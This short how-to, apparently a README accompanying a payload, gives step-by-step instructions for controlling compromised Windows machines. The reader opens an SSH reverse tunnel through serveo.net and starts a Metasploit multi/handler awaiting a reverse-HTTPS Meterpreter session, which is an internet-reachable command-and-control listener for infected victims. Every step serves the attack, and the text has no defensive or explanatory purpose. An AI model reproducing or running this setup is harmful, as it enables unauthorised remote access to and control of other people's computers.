How to control:

1.install openssh

2. type "ssh -R 3249:localhost:3249 serveo.net

3.start msfconsole;use multi/handler;set payload windows/meterpreter/reverse_https;set lhost localhost;set lport 3249;exploit

4.GET A METERPRETER!!
